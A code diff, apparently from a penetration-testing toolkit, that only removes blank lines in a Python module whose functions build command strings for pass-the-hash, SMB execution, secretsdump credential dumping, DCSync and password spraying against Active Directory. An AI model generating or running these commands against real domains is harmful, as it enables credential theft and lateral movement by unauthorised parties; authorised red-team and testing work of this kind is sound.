@@ -11,7 +11,6 @@ __all__ = [
     "acl_abuse_commands",
 ]
 
-
 def pass_the_hash_command(
     target: str,
     username: str,
@@ -27,7 +26,6 @@ def pass_the_hash_command(
         method: ``wmiexec`` | ``psexec`` | ``smbexec`` | ``atexec``.
     """
     return f"{method}.py -hashes :{nt_hash} {domain}/{username}@{target} '{command}'"
-
 
 def smb_exec_command(
     target: str,
@@ -45,7 +43,6 @@ def smb_exec_command(
     """
     return f"{method}.py {domain}/{username}:'{password}'@{target} '{command}'"
 
-
 def secretsdump_command(
     target: str,
     username: str,
@@ -62,7 +59,6 @@ def secretsdump_command(
         f"{flags} -outputfile {output}"
     )
 
-
 def dcsync_command(
     domain: str,
     username: str,
@@ -75,7 +71,6 @@ def dcsync_command(
         f"secretsdump.py -just-dc-user {target_user} "
         f"{domain}/{username}:'{password}'@{dc_ip}"
     )
-
 
 def spray_command(
     dc_ip: str,
@@ -97,7 +92,6 @@ def spray_command(
         f"netexec {protocol} {dc_ip} -u {users_file} -p '{password}' "
         f"-d {domain} --continue-on-success {jitter_flag}"
     ).strip()
-
 
 def acl_abuse_commands(
     domain: str,
